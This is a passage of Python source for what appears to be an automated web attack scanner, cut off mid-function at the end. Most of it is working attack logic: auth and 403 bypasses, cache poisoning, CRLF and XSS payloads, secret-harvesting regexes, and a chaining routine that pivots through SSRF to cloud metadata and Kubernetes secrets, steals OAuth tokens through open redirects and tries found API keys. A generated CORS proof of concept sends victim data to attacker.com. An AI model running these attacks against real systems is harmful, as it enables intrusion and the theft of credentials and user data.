    for url in list(crawl_data.get("params", {}).keys())[:30]:
        for current, alternatives in version_patterns:
            if current in url:
                for alt in alternatives:
                    alt_url = url.replace(current, alt)
                    if alt_url in tested:
                        continue
                    tested.add(alt_url)
                    try:
                        r_current = _S.get(url, timeout=_TIMEOUT_SHORT)
                        r_alt = _S.get(alt_url, timeout=_TIMEOUT_SHORT)
                        if r_alt.status_code == 200 and r_current.status_code in (401, 403):
                            findings.append({
                                "type": "API Version Bypass — Auth Bypass",
                                "severity": "high",
                                "url": alt_url,
                                "detail": f"Current version ({current.strip('/')}) requires auth, but older version ({alt.strip('/')}) is unprotected",
                                "template": "apex-api-version-bypass",
                            })
                        elif (r_alt.status_code == 200 and r_current.status_code == 200
                              and len(r_alt.text) > len(r_current.text) + 100):
                            findings.append({
                                "type": "API Version Leak — More Data in Old Version",
                                "severity": "medium",
                                "url": alt_url,
                                "detail": f"Older API version returns more data (+{len(r_alt.text)-len(r_current.text)} bytes) — may expose removed fields",
                                "template": "apex-api-version-leak",
                            })
                    except Exception:
                        continue
    return findings


# ---------------------------------------------------------------------------
# Batch 25 — CORS PoC, JS secrets, HPP, cache poisoning, CRLF, 403 bypass, PII
# ---------------------------------------------------------------------------

def scan_cors_generate_poc(crawl_data):
    """CORS exploitation — generates HTML PoC that steals data from vulnerable endpoints."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:15]:
        url = page["url"]
        base = "/".join(url.split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)
        try:
            r = _S.get(url, headers={"Origin": "https://evil.com"}, timeout=_TIMEOUT_SHORT)
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            if acao == "https://evil.com" and acac.lower() == "true":
                # Generate exploitation PoC
                poc_html = f"""<html>
<body>
<h2>CORS Data Theft PoC</h2>
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '{url}', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {{
  if (xhr.readyState == 4) {{
    // Exfiltrate stolen data
    document.getElementById('stolen').innerText = xhr.responseText;
    new Image().src = 'https://attacker.com/log?data=' + btoa(xhr.responseText);
  }}
}};
xhr.send();
</script>
<pre id="stolen">Loading victim data...</pre>
</body></html>"""
                findings.append({
                    "type": "CORS Data Theft (PoC Generated)",
                    "severity": "high",
                    "url": url,
                    "detail": f"Origin https://evil.com reflected with credentials. Victim's data can be stolen cross-origin.",
                    "template": "apex-cors-poc",
                    "poc_html": poc_html,
                })
        except Exception:
            continue
    return findings


def scan_js_secrets_deep(crawl_data, web_targets):
    """Extract secrets from JavaScript source maps, webpack chunks, and inline scripts."""
    findings = []
    secret_patterns = {
        "AWS Access Key": re.compile(r"AKIA[0-9A-Z]{16}"),
        "AWS Secret Key": re.compile(r"(?:aws_secret|secret_key|secretAccessKey)['\"\s:=]+([A-Za-z0-9/+=]{40})"),
        "Google API Key": re.compile(r"AIza[0-9A-Za-z\-_]{35}"),
        "Stripe Secret": re.compile(r"sk_live_[0-9a-zA-Z]{24,}"),
        "Stripe Publishable": re.compile(r"pk_live_[0-9a-zA-Z]{24,}"),
        "GitHub Token": re.compile(r"gh[pousr]_[A-Za-z0-9_]{36,}"),
        "Slack Token": re.compile(r"xox[baprs]-[0-9a-zA-Z\-]{10,}"),
        "Private Key": re.compile(r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----"),
        "JWT Secret": re.compile(r"""(?:jwt[_-]?secret|JWT_SECRET)['":\s=]+['"]([^'"]{8,})['"]"""),
        "Database URL": re.compile(r"(?:mysql|postgres|mongodb|redis)://[^\s'\"<>]{10,}"),
        "SendGrid Key": re.compile(r"SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}"),
        "Twilio SID": re.compile(r"AC[a-f0-9]{32}"),
        "Firebase Key": re.compile(r"AIza[0-9A-Za-z_-]{35}"),
        "Mailgun Key": re.compile(r"key-[0-9a-zA-Z]{32}"),
        "Heroku API Key": re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"),
    }

    seen_secrets = set()
    js_urls = set()

    # Collect JS URLs from crawl data
    for page in crawl_data.get("pages", [])[:20]:
        url = page["url"]
        try:
            r = _S.get(url, timeout=_TIMEOUT_SHORT)
            # Find script sources
            for m in re.finditer(r'<script[^>]+src=["\']([^"\']+)["\']', r.text):
                src = m.group(1)
                full = src if src.startswith("http") else urllib.parse.urljoin(url, src)
                js_urls.add(full)
            # Find source maps
            for m in re.finditer(r'//[#@]\s*sourceMappingURL=(\S+)', r.text):
                map_url = m.group(1)
                full = map_url if map_url.startswith("http") else urllib.parse.urljoin(url, map_url)
                js_urls.add(full)
        except Exception:
            continue

    # Also try common webpack chunk patterns
    for target in web_targets[:3]:
        base = target.rstrip("/")
        for pattern in ["/_next/static/chunks/", "/static/js/", "/assets/js/", "/dist/", "/build/static/js/"]:
            try:
                r = _S.get(f"{base}{pattern}", timeout=_TIMEOUT_SHORT)
                for m in re.finditer(r'href=["\']([^"\']*\.js)["\']', r.text):
                    js_urls.add(urllib.parse.urljoin(f"{base}{pattern}", m.group(1)))
            except Exception:
                continue

    # Scan all JS files for secrets
    for js_url, r in batch_get(list(js_urls)[:50], timeout=_TIMEOUT):
        if r is None or r.status_code != 200:
            continue
        content = r.text
        for secret_name, pattern in secret_patterns.items():
            for match in pattern.finditer(content):
                val = match.group()[:80]
                key = f"{secret_name}:{val[:20]}"
                if key in seen_secrets:
                    continue
                seen_secrets.add(key)
                # Verify it's not a placeholder
                if any(x in val.lower() for x in ["example", "placeholder", "xxx", "your_", "insert"]):
                    continue
                findings.append({
                    "type": f"JS Secret: {secret_name}",
                    "severity": "critical" if "private key" in secret_name.lower() or "secret" in secret_name.lower() else "high",
                    "url": js_url,
                    "detail": f"Found {secret_name}: {val[:60]}...",
                    "template": "apex-js-secret",
                })
    return findings


def scan_hpp(crawl_data):
    """HTTP Parameter Pollution — duplicate params to bypass validation."""
    findings = []
    for url, params in list(crawl_data.get("params", {}).items())[:20]:
        for p in params[:3]:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            original_val = qs.get(p, ["1"])[0]

            # HPP: send same param twice with different values
            hpp_url = f"{url}&{p}=admin"
            if "?" not in url:
                hpp_url = f"{url}?{p}={original_val}&{p}=admin"
            try:
                r_normal = _S.get(url, timeout=_TIMEOUT_SHORT)
                r_hpp = _S.get(hpp_url, timeout=_TIMEOUT_SHORT)
                # If response differs significantly, HPP works
                if r_hpp.status_code == 200 and r_normal.status_code == 200:
                    if abs(len(r_hpp.text) - len(r_normal.text)) > 100 or r_hpp.text != r_normal.text:
                        # Check if the second value was used
                        if "admin" in r_hpp.text.lower() and "admin" not in r_normal.text.lower():
                            findings.append({
                                "type": f"HTTP Parameter Pollution ({p})",
                                "severity": "high",
                                "url": hpp_url,
                                "detail": f"Duplicate param '{p}' accepted — second value 'admin' reflected. Bypass filters/WAF.",
                                "template": "apex-hpp",
                            })
            except Exception:
                continue
    return findings


def scan_cache_poisoning_unkeyed(crawl_data, web_targets):
    """Cache poisoning via unkeyed headers — X-Forwarded-Host, X-Original-URL, etc."""
    findings = []
    poison_headers = [
        ("X-Forwarded-Host", "evil.com"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
        ("X-Forwarded-Scheme", "nothttps"),
        ("X-Forwarded-Port", "1337"),
        ("X-Host", "evil.com"),
        ("X-Forwarded-Server", "evil.com"),
    ]

    for target in web_targets[:8]:
        try:
            # Baseline
            r_base = _S.get(target, timeout=_TIMEOUT_SHORT)
            base_body = r_base.text

            for header, value in poison_headers:
                r = _S.get(target, headers={header: value}, timeout=_TIMEOUT_SHORT)
                if r.status_code == 200:
                    # Check if the poisoned value appears in response
                    if value in r.text and value not in base_body:
                        # Verify it's cached by requesting again without the header
                        time.sleep(0.5)
                        r_verify = _S.get(target, timeout=_TIMEOUT_SHORT)
                        if value in r_verify.text:
                            findings.append({
                                "type": f"Web Cache Poisoning ({header})",
                                "severity": "critical",
                                "url": target,
                                "detail": f"Header '{header}: {value}' reflected AND cached. All users see poisoned response.",
                                "template": "apex-cache-poison",
                            })
                        else:
                            findings.append({
                                "type": f"Unkeyed Header Reflection ({header})",
                                "severity": "medium",
                                "url": target,
                                "detail": f"Header '{header}: {value}' reflected but not cached. Potential for targeted attacks.",
                                "template": "apex-unkeyed-header",
                            })
                        break
        except Exception:
            continue
    return findings


def scan_crlf_advanced(crawl_data, web_targets):
    """CRLF injection — inject headers for XSS, cache poisoning, session fixation."""
    findings = []
    crlf_payloads = [
        ("%0d%0aX-Injected: apex", "X-Injected: apex"),
        ("%0d%0aSet-Cookie: apex=pwned", "Set-Cookie: apex=pwned"),
        ("%0d%0a%0d%0a<script>alert(1)</script>", "<script>alert(1)</script>"),
        ("\r\nX-Injected: apex", "X-Injected: apex"),
        ("%E5%98%8A%E5%98%8DX-Injected: apex", "X-Injected: apex"),  # Unicode CRLF
    ]

    for target in web_targets[:5]:
        base = target.rstrip("/")
        # Test on redirect endpoints and any URL with params
        test_urls = [f"{base}/apex-crlf-test"]
        for url in list(crawl_data.get("params", {}).keys())[:10]:
            test_urls.append(url)

        for url in test_urls:
            for payload, indicator in crlf_payloads:
                test_url = f"{url}{payload}" if "?" not in url else f"{url}&x={payload}"
                try:
                    r = _S.get(test_url, timeout=_TIMEOUT_SHORT, allow_redirects=False)
                    # Check response headers for injection
                    all_headers = "\r\n".join(f"{k}: {v}" for k, v in r.headers.items())
                    if "X-Injected: apex" in all_headers or "Set-Cookie: apex=pwned" in all_headers:
                        findings.append({
                            "type": "CRLF Injection (Header Injection)",
                            "severity": "high",
                            "url": test_url,
                            "detail": f"Injected header appears in response. Can set cookies, poison cache, or inject XSS.",
                            "template": "apex-crlf",
                        })
                        break
                    # Check body for XSS via CRLF
                    if "<script>alert(1)</script>" in r.text:
                        findings.append({
                            "type": "CRLF → XSS (Response Splitting)",
                            "severity": "critical",
                            "url": test_url,
                            "detail": "CRLF injection splits response — XSS payload in body",
                            "template": "apex-crlf-xss",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_403_bypass_advanced(crawl_data, web_targets):
    """403 bypass with path normalization, verb override, header tricks."""
    findings = []
    # Find 403 pages first
    forbidden_urls = []
    admin_paths = ["/admin", "/dashboard", "/internal", "/manage", "/console",
                   "/api/admin", "/api/internal", "/debug", "/actuator"]

    for target in web_targets[:5]:
        base = target.rstrip("/")
        for path in admin_paths:
            try:
                r = _S.get(f"{base}{path}", timeout=_TIMEOUT_SHORT)
                if r.status_code == 403:
                    forbidden_urls.append(f"{base}{path}")
            except Exception:
                continue

    for url in forbidden_urls[:10]:
        parsed = urllib.parse.urlparse(url)
        path = parsed.path
        base = f"{parsed.scheme}://{parsed.netloc}"

        bypass_techniques = [
            # Path normalization
            (f"{base}{path}/", "trailing slash"),
            (f"{base}{path}/.", "trailing dot"),
            (f"{base}/{path.lstrip('/')}", "double slash prefix"),
            (f"{base}{path}%20", "URL-encoded space"),
            (f"{base}{path}%09", "tab character"),
            (f"{base}{path}..;/", "path traversal semicolon"),
            (f"{base}{path};", "semicolon"),
            (f"{base}{path}/.randomfile", "fake file extension"),
            (f"{base}{path}#", "fragment"),
            (f"{base}{path}?", "empty query"),
            # Case variation
            (f"{base}{path.upper()}", "uppercase path"),
            (f"{base}{path.replace('/', '//')}", "double slash"),
        ]

        header_bypasses = [
            {"X-Original-URL": path},
            {"X-Rewrite-URL": path},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"Content-Length": "0"},  # verb override trick
        ]

        # Test path bypasses
        for bypass_url, technique in bypass_techniques:
            try:
                r = _S.get(bypass_url, timeout=_TIMEOUT_SHORT)
                if r.status_code == 200 and len(r.text) > 100:
                    findings.append({
                        "type": f"403 Bypass ({technique})",
                        "severity": "high",
                        "url": bypass_url,
                        "detail": f"Original {path} returns 403, but '{technique}' returns 200 ({len(r.text)} bytes)",
                        "template": "apex-403-bypass",
                    })
                    break
            except Exception:
                continue

        # Test header bypasses
        for headers in header_bypasses:
            try:
                r = _S.get(url, headers=headers, timeout=_TIMEOUT_SHORT)
                if r.status_code == 200 and len(r.text) > 100:
                    header_name = list(headers.keys())[0]
                    findings.append({
                        "type": f"403 Bypass ({header_name})",
                        "severity": "high",
                        "url": url,
                        "detail": f"Header '{header_name}: {headers[header_name]}' bypasses 403 restriction",
                        "template": "apex-403-bypass",
                    })
                    break
            except Exception:
                continue

        # Test HTTP method override
        for method in ["POST", "PUT", "PATCH", "OPTIONS", "TRACE"]:
            try:
                r = _S.request(method, url, timeout=_TIMEOUT_SHORT)
                if r.status_code == 200 and len(r.text) > 100:
                    findings.append({
                        "type": f"403 Bypass (HTTP Method: {method})",
                        "severity": "high",
                        "url": url,
                        "detail": f"GET returns 403 but {method} returns 200 — verb-based access control bypass",
                        "template": "apex-403-bypass",
                    })
                    break
            except Exception:
                continue
    return findings


def scan_sensitive_data_exposure(crawl_data):
    """Detect sensitive data in responses — credit cards, SSNs, API keys, emails, phone numbers."""
    findings = []
    pii_patterns = {
        "Credit Card (Visa)": re.compile(r"\b4[0-9]{12}(?:[0-9]{3})?\b"),
        "Credit Card (Mastercard)": re.compile(r"\b5[1-5][0-9]{14}\b"),
        "Credit Card (Amex)": re.compile(r"\b3[47][0-9]{13}\b"),
        "SSN": re.compile(r"\b\d{3}-\d{2}-\d{4}\b"),
        "Email (bulk)": re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"),
        "Phone (US)": re.compile(r"\b\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}\b"),
        "AWS Key": re.compile(r"AKIA[0-9A-Z]{16}"),
        "Private Key": re.compile(r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----"),
        "Password Hash (bcrypt)": re.compile(r"\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}"),
        "Password Hash (MD5)": re.compile(r"\b[a-f0-9]{32}\b"),
        "Internal IP": re.compile(r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3})\b"),
    }

    seen = set()
    for page in crawl_data.get("pages", [])[:30]:
        url = page["url"]
        try:
            r = _S.get(url, timeout=_TIMEOUT_SHORT)
            if r.status_code != 200:
                continue
            body = r.text
            for pii_name, pattern in pii_patterns.items():
                matches = pattern.findall(body)
                if not matches:
                    continue
                # Filter noise
                if pii_name == "Email (bulk)" and len(matches) < 5:
                    continue  # Single emails are normal
                if pii_name == "Password Hash (MD5)" and len(matches) < 3:
                    continue  # Could be CSS colors
                if pii_name == "Internal IP" and len(matches) < 2:
                    continue
                key = f"{pii_name}:{url}"
                if key in seen:
                    continue
                seen.add(key)
                severity = "critical" if any(x in pii_name for x in ["Credit Card", "SSN", "Private Key", "AWS"]) else "high"
                findings.append({
                    "type": f"Sensitive Data Exposure: {pii_name}",
                    "severity": severity,
                    "url": url,
                    "detail": f"Found {len(matches)} instances of {pii_name} in response body",
                    "template": "apex-pii-exposure",
                })
        except Exception:
            continue
    return findings


# ---------------------------------------------------------------------------
# Batch 26 — BFLA, endpoint discovery, response timing analysis, content-type confusion
# ---------------------------------------------------------------------------

def scan_bfla(crawl_data, web_targets):
    """Broken Function Level Authorization — access admin endpoints as regular user."""
    findings = []
    admin_indicators = ["admin", "manage", "internal", "staff", "moderator",
                        "superuser", "config", "settings", "system", "debug"]
    user_endpoints = []
    admin_endpoints = []

    # Categorize endpoints
    for url in list(crawl_data.get("params", {}).keys()) + [p["url"] for p in crawl_data.get("pages", [])]:
        lower = url.lower()
        if any(x in lower for x in admin_indicators):
            admin_endpoints.append(url)
        else:
            user_endpoints.append(url)

    # Try accessing admin endpoints (should be 403/401 for regular users)
    for url in admin_endpoints[:15]:
        try:
            r = _S.get(url, timeout=_TIMEOUT_SHORT)
            if r.status_code == 200 and len(r.text) > 100:
                # Verify it's not a generic page
                if any(x in r.text.lower() for x in ["admin", "dashboard", "users", "settings",
                                                       "configuration", "manage", "delete"]):
                    findings.append({
                        "type": "Broken Function Level Authorization (BFLA)",
                        "severity": "critical",
                        "url": url,
                        "detail": f"Admin endpoint accessible without elevated privileges. Contains admin content.",
                        "template": "apex-bfla",
                    })
        except Exception:
            continue

    # Also try adding /admin, /api/admin to known user endpoints
    for target in web_targets[:3]:
        base = target.rstrip("/")
        admin_paths = ["/admin/users", "/api/admin/users", "/api/users?role=admin",
                       "/internal/config", "/api/internal/settings", "/debug/vars",
                       "/api/v1/admin", "/manage/accounts"]
        test_urls = [f"{base}{p}" for p in admin_paths]
        for url, r in batch_get(test_urls, timeout=_TIMEOUT_SHORT):
            if r and r.status_code == 200 and len(r.text) > 200:
                if any(x in r.text.lower() for x in ["user", "email", "admin", "config", "password"]):
                    findings.append({
                        "type": "BFLA — Admin Endpoint Exposed",
                        "severity": "critical",
                        "url": url,
                        "detail": f"Admin/internal endpoint returns data without auth ({len(r.text)} bytes)",
                        "template": "apex-bfla",
                    })
    return findings


def scan_endpoint_discovery(web_targets):
    """Discover hidden API endpoints via common patterns and wordlist."""
    findings = []
    # High-value hidden endpoints
    hidden_endpoints = [
        # Debug/internal
        "/debug", "/debug/vars", "/debug/pprof", "/_debug", "/trace",
        "/metrics", "/prometheus", "/health", "/healthz", "/ready",
        "/status", "/info", "/version", "/build-info",
        # Admin
        "/admin", "/admin/login", "/administrator", "/manage",
        "/console", "/dashboard", "/panel", "/portal",
        # API docs
        "/swagger", "/swagger-ui", "/swagger-ui.html", "/api-docs",
        "/openapi.json", "/swagger.json", "/redoc", "/graphql/playground",
        "/graphiql", "/_explorer",
        # Config/secrets
        "/.env", "/.git/config", "/.git/HEAD", "/config.json",
        "/config.yml", "/application.yml", "/appsettings.json",
        "/wp-config.php.bak", "/web.config", "/.htaccess",
        # Backup
        "/backup", "/backup.sql", "/dump.sql", "/database.sql",
        "/db.sql", "/data.json", "/export", "/download",
        # Dev
        "/test", "/dev", "/staging", "/beta", "/sandbox",
        "/phpinfo.php", "/info.php", "/server-status", "/server-info",
    ]

    for target in web_targets[:5]:
        base = target.rstrip("/")
        urls = [f"{base}{ep}" for ep in hidden_endpoints]
        for url, r in batch_get(urls, timeout=_TIMEOUT_SHORT):
            if r is None or r.status_code != 200:
                continue
            if len(r.text) < 50:
                continue
            # Verify not a soft 404
            body_lower = r.text[:500].lower()
            if any(x in body_lower for x in ["not found", "404", "page not found", "does not exist"]):
                continue
            path = url.replace(base, "")
            severity = "critical" if any(x in path for x in [".env", ".git", "backup", "dump", "config"]) else "medium"
            if any(x in body_lower for x in ["password", "secret", "key", "token", "database"]):
                severity = "critical"
            findings.append({
                "type": f"Hidden Endpoint: {path}",
                "severity": severity,
                "url": url,
                "detail": f"Discovered hidden endpoint ({len(r.text)} bytes). May expose sensitive data or functionality.",
                "template": "apex-hidden-endpoint",
            })
    return findings


def scan_content_type_confusion(crawl_data):
    """Content-type confusion — send JSON to form endpoints and vice versa to bypass validation."""
    findings = []
    for form in crawl_data.get("forms", [])[:10]:
        action = form.get("action", "")
        if not action or form.get("method", "").upper() != "POST":
            continue
        inputs = form.get("inputs", [])
        if not inputs:
            continue

        # Build form data
        form_data = {i.get("name", "x"): i.get("value", "test") for i in inputs if i.get("name")}

        try:
            # Normal form submission
            r_form = _S.post(action, data=form_data, timeout=_TIMEOUT)

            # Same data as JSON
            r_json = _S.post(action, json=form_data,
                             headers={"Content-Type": "application/json"}, timeout=_TIMEOUT)

            # If JSON request bypasses validation that form enforces
            if r_form.status_code in (400, 422, 403) and r_json.status_code in (200, 201):
                findings.append({
                    "type": "Content-Type Confusion — Validation Bypass",
                    "severity": "high",
                    "url": action,
                    "detail": "Form submission rejected (400/422) but JSON accepted (200). Server-side validation only checks form data.",
                    "template": "apex-content-type-confusion",
                })
            # Try with no content-type
            r_none = _S.post(action, data=json.dumps(form_data),
                             headers={"Content-Type": ""}, timeout=_TIMEOUT)
            if r_none.status_code == 200 and r_form.status_code in (400, 422):
                findings.append({
                    "type": "Content-Type Confusion — Empty Content-Type Bypass",
                    "severity": "medium",
                    "url": action,
                    "detail": "Empty Content-Type header bypasses input validation",
                    "template": "apex-content-type-confusion",
                })
        except Exception:
            continue
    return findings


def scan_timing_attacks(crawl_data, web_targets):
    """Response timing analysis — detect user enumeration and hidden logic via timing differences."""
    findings = []

    # Find login/auth endpoints
    auth_urls = []
    for url in list(crawl_data.get("params", {}).keys()):
        if any(x in url.lower() for x in ["/login", "/auth", "/signin", "/api/login"]):
            auth_urls.append(url)

    for target in web_targets[:3]:
        base = target.rstrip("/")
        for path in ["/api/login", "/login", "/auth/login", "/api/auth"]:
            auth_urls.append(f"{base}{path}")

    for url in list(set(auth_urls))[:5]:
        try:
            # Time with valid-looking email
            times_valid = []
            times_invalid = []
            for _ in range(3):
                t0 = time.time()
                _S.post(url, json={"email": "admin@company.com", "password": "wrong123"},
                        timeout=_TIMEOUT)
                times_valid.append(time.time() - t0)

                t0 = time.time()
                _S.post(url, json={"email": "nonexistent_xyz_apex@fake.com", "password": "wrong123"},
                        timeout=_TIMEOUT)
                times_invalid.append(time.time() - t0)

            avg_valid = sum(times_valid) / len(times_valid)
            avg_invalid = sum(times_invalid) / len(times_invalid)

            # If valid user takes significantly longer (bcrypt comparison happens)
            if avg_valid > avg_invalid + 0.1:
                findings.append({
                    "type": "Timing-Based User Enumeration",
                    "severity": "medium",
                    "url": url,
                    "detail": f"Valid user: {avg_valid:.3f}s avg, invalid: {avg_invalid:.3f}s avg. Difference: {(avg_valid-avg_invalid)*1000:.0f}ms",
                    "template": "apex-timing-enum",
                })
        except Exception:
            continue
    return findings


# ---------------------------------------------------------------------------
# Batch 27 — Feedback loop engine: findings feed into deeper attacks
# ---------------------------------------------------------------------------

def feedback_loop_attack(vulnerabilities, crawl_data, web_targets):
    """Use confirmed findings to launch deeper, chained attacks.
    This is what separates $100k hunters from scanner jockeys."""
    findings = []

    # Categorize existing findings
    ssrf_urls = []
    open_redirects = []
    api_keys = []
    idor_endpoints = []
    xss_endpoints = []
    auth_endpoints = []

    for v in vulnerabilities:
        vtype = v.get("type", "").lower()
        url = v.get("url", "")
        if "ssrf" in vtype and url:
            ssrf_urls.append(url)
        if "redirect" in vtype and url:
            open_redirects.append(url)
        if "secret" in vtype or "api key" in vtype or "key" in vtype:
            # Extract the actual key value
            detail = v.get("detail", "")
            key_match = re.search(r'(AKIA[0-9A-Z]{16}|sk_live_\w+|gh[pousr]_\w+|AIza[\w-]{35}|SG\.[\w-]+\.[\w-]+)', detail)
            if key_match:
                api_keys.append({"type": vtype, "key": key_match.group(1), "url": url})
        if "idor" in vtype and url:
            idor_endpoints.append(url)
        if "xss" in vtype and url:
            xss_endpoints.append(url)

    # --- SSRF Pivot: Internal port scan + service discovery ---
    if ssrf_urls:
        findings.extend(_ssrf_internal_scan(ssrf_urls[0]))

    # --- Open Redirect → OAuth token theft ---
    if open_redirects:
        findings.extend(_redirect_to_oauth_theft(open_redirects, crawl_data, web_targets))

    # --- API Key exploitation ---
    for key_info in api_keys[:3]:
        findings.extend(_exploit_api_key(key_info))

    # --- IDOR escalation: enumerate more resources ---
    if idor_endpoints:
        findings.extend(_idor_mass_enumerate(idor_endpoints))

    # --- XSS → Account Takeover chain ---
    if xss_endpoints and auth_endpoints:
        findings.extend(_xss_to_ato(xss_endpoints, auth_endpoints, web_targets))

    return findings


def _ssrf_internal_scan(ssrf_url):
    """Pivot through confirmed SSRF to scan internal network."""
    findings = []
    # Extract the SSRF injection point
    parsed = urllib.parse.urlparse(ssrf_url)
    qs = urllib.parse.parse_qs(parsed.query)

    # Find the param that contains the SSRF payload
    ssrf_param = None
    for p, vals in qs.items():
        for v in vals:
            if "169.254" in v or "127.0.0" in v or "localhost" in v:
                ssrf_param = p
                break

    if not ssrf_param:
        return findings

    # Internal services to probe through SSRF
    internal_targets = [
        # Common internal services
        ("http://127.0.0.1:6379/", "redis", "Redis"),
        ("http://127.0.0.1:27017/", "mongodb", "MongoDB"),
        ("http://127.0.0.1:5432/", "postgres", "PostgreSQL"),
        ("http://127.0.0.1:3306/", "mysql", "MySQL"),
        ("http://127.0.0.1:9200/", "elasticsearch", "Elasticsearch"),
        ("http://127.0.0.1:8500/v1/agent/self", "consul", "Consul"),
        ("http://127.0.0.1:2379/version", "etcd", "etcd"),
        ("http://127.0.0.1:8080/", "internal-web", "Internal Web"),
        ("http://127.0.0.1:8000/", "internal-api", "Internal API"),
        ("http://127.0.0.1:3000/", "grafana", "Grafana"),
        ("http://127.0.0.1:9090/", "prometheus", "Prometheus"),
        ("http://127.0.0.1:15672/", "rabbitmq", "RabbitMQ"),
        ("http://127.0.0.1:8161/", "activemq", "ActiveMQ"),
        ("http://127.0.0.1:4040/", "spark", "Spark UI"),
        ("http://127.0.0.1:7474/", "neo4j", "Neo4j"),
        # AWS internal
        ("http://169.254.169.254/latest/user-data", "aws-userdata", "AWS User Data"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "aws-iam", "AWS IAM Roles"),
        # Kubernetes
        ("http://127.0.0.1:10250/pods", "kubelet", "Kubelet API"),
        ("http://127.0.0.1:8001/api/v1/namespaces", "k8s-api", "Kubernetes API"),
        ("http://kubernetes.default.svc/api/v1/secrets", "k8s-secrets", "K8s Secrets"),
        # Docker
        ("http://127.0.0.1:2375/containers/json", "docker", "Docker API"),
        ("http://127.0.0.1:2376/containers/json", "docker-tls", "Docker TLS API"),
        # GCP
        ("http://metadata.google.internal/computeMetadata/v1/?recursive=true", "gcp-meta", "GCP Metadata"),
    ]

    # Fire all probes through the SSRF
    test_urls = []
    test_meta = {}
    for internal_url, svc_id, svc_name in internal_targets:
        qs[ssrf_param] = [internal_url]
        test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
        test_urls.append(test_url)
        test_meta[test_url] = (internal_url, svc_id, svc_name)

    for test_url, r in batch_get(test_urls, timeout=8):
        if r is None or r.status_code != 200:
            continue
        internal_url, svc_id, svc_name = test_meta[test_url]
        body = r.text[:2000]

        # Check if we got real service response (not just the SSRF endpoint's error page)
        service_indicators = {
            "redis": ["+OK", "redis_version", "-ERR"],
            "mongodb": ["ismaster", "MongoDB"],
            "elasticsearch": ["cluster_name", "lucene_version"],
            "consul": ["Config", "Member"],
            "etcd": ["etcdserver", "etcdcluster"],
            "grafana": ["grafana", "login"],
            "prometheus": ["prometheus", "tsdb"],
            "rabbitmq": ["RabbitMQ"],
            "kubelet": ["metadata", "containers"],
            "k8s-api": ["apiVersion", "items"],
            "k8s-secrets": ["apiVersion", "Secret"],
            "docker": ["Id", "Image", "Names"],
            "aws-userdata": True,  # Any response = success
            "aws-iam": True,
            "gcp-meta": ["projectId", "instance"],
        }

        indicators = service_indicators.get(svc_id, [])
        if indicators is True or (isinstance(indicators, list) and any(x in body for x in indicators)):
            severity = "critical"
            if svc_id in ("k8s-secrets", "docker", "aws-iam", "gcp-meta"):
                severity = "critical"
            elif svc_id in ("redis", "mongodb", "elasticsearch", "consul"):
                severity = "critical"

            findings.append({
                "type": f"SSRF → Internal {svc_name} Access",
                "severity": severity,
                "url": test_url,
                "detail": f"Pivoted through SSRF to reach {svc_name} at {internal_url}. Response: {body[:150]}",
                "template": f"apex-ssrf-pivot-{svc_id}",
            })

    return findings


def _redirect_to_oauth_theft(redirect_urls, crawl_data, web_targets):
    """Chain open redirect with OAuth to steal tokens."""
    findings = []
    # Find OAuth endpoints
    oauth_endpoints = []
    for url in list(crawl_data.get("params", {}).keys()):
        if any(x in url.lower() for x in ["/oauth", "/authorize", "/auth/", "/login/oauth"]):
            oauth_endpoints.append(url)

    for target in web_targets[:3]:
        base = target.rstrip("/")
        for path in ["/oauth/authorize", "/auth/authorize", "/login/oauth",
                     "/.well-known/openid-configuration"]:
            try:
                r = _S.get(f"{base}{path}", timeout=_TIMEOUT_SHORT)
                if r.status_code in (200, 302, 400):
                    oauth_endpoints.append(f"{base}{path}")
            except Exception:
                continue

    if not oauth_endpoints:
        return findings

    # Try to chain: redirect_uri=<open_redirect_url> → steals token
    for oauth_url in oauth_endpoints[:3]:
        for redirect_url in redirect_urls[:3]:
            # Construct OAuth flow with our redirect as callback
            parsed = urllib.parse.urlparse(oauth_url)
            qs = urllib.parse.parse_qs(parsed.query)
            qs["redirect_uri"] = [redirect_url]
            qs["response_type"] = ["token"]
            qs["client_id"] = qs.get("client_id", ["test"])
            chain_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()

            try:
                r = _S.get(chain_url, timeout=_TIMEOUT, allow_redirects=False)
                if r.status_code in (302, 303) and "evil.com" in r.headers.get("Location", ""):
                    findings.append({
                        "type": "Open Redirect → OAuth Token Theft (Chained)",
                        "severity": "critical",
                        "url": chain_url,
                        "detail": f"OAuth accepts open redirect as redirect_uri. Tokens sent to attacker. Chain: {redirect_url[:60]} → OAuth → token theft",
                        "template": "apex-chain-redirect-oauth",
                    })
                    break
            except Exception:
                continue
    return findings


def _exploit_api_key(key_info):
    """Try to use discovered API keys to access services."""
    findings = []
    key = key_info["key"]
    key_type = key_info["type"]

    if key.startswith("AKIA"):
        # AWS key — try to list S3 buckets
        try:
            # Use the key to call AWS STS GetCallerIdentity
            import hmac, hashlib
            # Just report it — actual exploitation would need secret key too
            findings.append({
                "type": "Exploitable AWS Access Key Found",
